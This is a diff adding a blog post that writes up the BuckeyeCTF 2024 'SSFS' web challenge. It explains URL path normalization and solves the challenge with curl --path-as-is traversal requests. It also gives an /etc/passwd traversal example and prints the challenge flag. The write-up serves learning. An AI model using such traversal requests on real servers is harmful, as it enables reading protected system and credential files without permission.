@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>BuckeyeCTF 2024 - SSFS | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, path traversal, web, curl">
+<meta name="description" content="Page Source Inspection
+The actual functionality of uploading and downloading files weren&rsquo;t working so I looked at the page source. I saw this portion of the source:
+const searchFile = async () =&gt; {
+	let formData = new FormData(searchForm);
+	console.log([...formData][0]);
+	let response = await fetch(&#39;/search/&#39; &#43; [...formData][0][1], {
+		method: &#39;GET&#39;,
+	});
+	searchWrapper.hidden = false;
+	if (response.status === 200) {
+		searchMessage.innerHTML = &#39;File found. Download link: &lt;a href=&#34;/download/&#39; &#43; [...formData][0][1] &#43; &#39;&#34;&gt;Download&lt;/a&gt;&#39;;
+	} else {
+		searchMessage.innerHTML = &#39;File not found.&#39;;
+	}
+}
+If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2024-10-07-buckeyectf-2024-ssfs/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2024-10-07-buckeyectf-2024-ssfs/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2024-10-07-buckeyectf-2024-ssfs/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="BuckeyeCTF 2024 - SSFS">
+  <meta property="og:description" content="Page Source Inspection The actual functionality of uploading and downloading files weren’t working so I looked at the page source. I saw this portion of the source:
+const searchFile = async () =&gt; { let formData = new FormData(searchForm); console.log([...formData][0]); let response = await fetch(&#39;/search/&#39; &#43; [...formData][0][1], { method: &#39;GET&#39;, }); searchWrapper.hidden = false; if (response.status === 200) { searchMessage.innerHTML = &#39;File found. Download link: &lt;a href=&#34;/download/&#39; &#43; [...formData][0][1] &#43; &#39;&#34;&gt;Download&lt;/a&gt;&#39;; } else { searchMessage.innerHTML = &#39;File not found.&#39;; } } If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-07T00:29:20+00:00">
+    <meta property="article:modified_time" content="2024-10-07T00:29:20+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Path Traversal">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Curl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BuckeyeCTF 2024 - SSFS">
+<meta name="twitter:description" content="Page Source Inspection
+The actual functionality of uploading and downloading files weren&rsquo;t working so I looked at the page source. I saw this portion of the source:
+const searchFile = async () =&gt; {
+	let formData = new FormData(searchForm);
+	console.log([...formData][0]);
+	let response = await fetch(&#39;/search/&#39; &#43; [...formData][0][1], {
+		method: &#39;GET&#39;,
+	});
+	searchWrapper.hidden = false;
+	if (response.status === 200) {
+		searchMessage.innerHTML = &#39;File found. Download link: &lt;a href=&#34;/download/&#39; &#43; [...formData][0][1] &#43; &#39;&#34;&gt;Download&lt;/a&gt;&#39;;
+	} else {
+		searchMessage.innerHTML = &#39;File not found.&#39;;
+	}
+}
+If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "BuckeyeCTF 2024 - SSFS",
+      "item": "https://joonkim0625.github.io/posts/2024-10-07-buckeyectf-2024-ssfs/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "BuckeyeCTF 2024 - SSFS",
+  "name": "BuckeyeCTF 2024 - SSFS",
+  "description": "Page Source Inspection The actual functionality of uploading and downloading files weren\u0026rsquo;t working so I looked at the page source. I saw this portion of the source:\nconst searchFile = async () =\u0026gt; { let formData = new FormData(searchForm); console.log([...formData][0]); let response = await fetch(\u0026#39;/search/\u0026#39; + [...formData][0][1], { method: \u0026#39;GET\u0026#39;, }); searchWrapper.hidden = false; if (response.status === 200) { searchMessage.innerHTML = \u0026#39;File found. Download link: \u0026lt;a href=\u0026#34;/download/\u0026#39; + [...formData][0][1] + \u0026#39;\u0026#34;\u0026gt;Download\u0026lt;/a\u0026gt;\u0026#39;; } else { searchMessage.innerHTML = \u0026#39;File not found.\u0026#39;; } } If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:\n",
+  "keywords": [
+    "ctf", "path traversal", "web", "curl"
+  ],
+  "articleBody": "Page Source Inspection The actual functionality of uploading and downloading files weren’t working so I looked at the page source. I saw this portion of the source:\nconst searchFile = async () =\u003e { let formData = new FormData(searchForm); console.log([...formData][0]); let response = await fetch('/search/' + [...formData][0][1], { method: 'GET', }); searchWrapper.hidden = false; if (response.status === 200) { searchMessage.innerHTML = 'File found. Download link: \u003ca href=\"/download/' + [...formData][0][1] + '\"\u003eDownload\u003c/a\u003e'; } else { searchMessage.innerHTML = 'File not found.'; } } If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:\nsearchMessage.innerHTML = 'File found. Download link: \u003ca href=\"/download/' + [...formData][0][1] + '\"\u003eDownload\u003c/a\u003e'; So, when I tried to access the /download/flag.txt, I got an error message back:\n└─$ curl https://ssfs.challs.pwnoh.io/download/flag.txt {\"message\":\"File not found\",\"status\":\"error\"} So, I assumed that this could be a path traversal related challenge (and also given that this is the very first challenge in the Web category). But when I tried a few different paths such as /download/../flag.txt or /download/../../flag.txt, I got an error that the URL was not found. When I looked at the web browser, my initial request address was resolved to https://ssfs.challs.pwnoh.io/flag.txt instead. This is because of the Path Normalization.\nPath Normalization Path Normalization is the process of transforming a URL’s path into a standard, canonical form. For example, if someone is trying to path traverse to access some secret file:\nhttp://example.com/download/../../etc/passwd This will resolve to:\nhttp://example.com/download/etc/passwd In order to ignore(?) this, I learned that I can use curl’s --path-as-is option to test possible path traversal vulnerability. Once I learned how to use this option, it was a basic path traversal challenge.\nSolve So, if we try something like this, we can get the flag:\n└─$ curl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt bctf{4lw4y5_35c4p3_ur_p4th5} ",
+  "wordCount" : "308",
+  "inLanguage": "en",
+  "datePublished": "2024-10-07T00:29:20Z",
+  "dateModified": "2024-10-07T00:29:20Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2024-10-07-buckeyectf-2024-ssfs/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      BuckeyeCTF 2024 - SSFS
+    </h1>
+    <div class="post-meta"><span title='2024-10-07 00:29:20 +0000 UTC'>October 7, 2024</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="page-source-inspection">Page Source Inspection<a hidden class="anchor" aria-hidden="true" href="#page-source-inspection">#</a></h2>
+<p>The actual functionality of uploading and downloading files weren&rsquo;t working so I looked at the page source. I saw this portion of the source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>const searchFile = async () =&gt; {
+</span></span><span style="display:flex;"><span>	let formData = new FormData(searchForm);
+</span></span><span style="display:flex;"><span>	console.log([...formData][0]);
+</span></span><span style="display:flex;"><span>	let response = await fetch(&#39;/search/&#39; + [...formData][0][1], {
+</span></span><span style="display:flex;"><span>		method: &#39;GET&#39;,
+</span></span><span style="display:flex;"><span>	});
+</span></span><span style="display:flex;"><span>	searchWrapper.hidden = false;
+</span></span><span style="display:flex;"><span>	if (response.status === 200) {
+</span></span><span style="display:flex;"><span>		searchMessage.innerHTML = &#39;File found. Download link: &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/download/&#39; + [...formData][0][1] + &#39;&#34;</span>&gt;Download&lt;/<span style="color:#f92672">a</span>&gt;&#39;;
+</span></span><span style="display:flex;"><span>	} else {
+</span></span><span style="display:flex;"><span>		searchMessage.innerHTML = &#39;File not found.&#39;;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>searchMessage.innerHTML = &#39;File found. Download link: &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/download/&#39; + [...formData][0][1] + &#39;&#34;</span>&gt;Download&lt;/<span style="color:#f92672">a</span>&gt;&#39;;
+</span></span></code></pre></div><p>So, when I tried to access the <code>/download/flag.txt</code>, I got an error message back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ curl https://ssfs.challs.pwnoh.io/download/flag.txt             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;File not found&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;error&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>So, I assumed that this could be a path traversal related challenge (and also given that this is the very first challenge in the Web category). But when I tried a few different paths such as <code>/download/../flag.txt or /download/../../flag.txt</code>, I got an error that the URL was not found. When I looked at the web browser, my initial request address was resolved to <code>https://ssfs.challs.pwnoh.io/flag.txt</code> instead. This is because of the <strong>Path Normalization</strong>.</p>
+<h2 id="path-normalization">Path Normalization<a hidden class="anchor" aria-hidden="true" href="#path-normalization">#</a></h2>
+<p><strong>Path Normalization</strong> is the process of transforming a URL&rsquo;s path into a standard, canonical form. For example, if someone is trying to path traverse to access some secret file:</p>
+<pre tabindex="0"><code>http://example.com/download/../../etc/passwd
+</code></pre><p>This will resolve to:</p>
+<pre tabindex="0"><code>http://example.com/download/etc/passwd
+</code></pre><p>In order to ignore(?) this, I learned that I can use <code>curl</code>&rsquo;s <code>--path-as-is</code> option to test possible path traversal vulnerability. Once I learned how to use this option, it was a basic path traversal challenge.</p>
+<h2 id="solve">Solve<a hidden class="anchor" aria-hidden="true" href="#solve">#</a></h2>
+<p>So, if we try something like this, we can get the flag:</p>
+<pre tabindex="0"><code>└─$ curl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt   
+bctf{4lw4y5_35c4p3_ur_p4th5}                                                                                                     
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/path-traversal/">Path Traversal</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/web/">Web</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/curl/">Curl</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
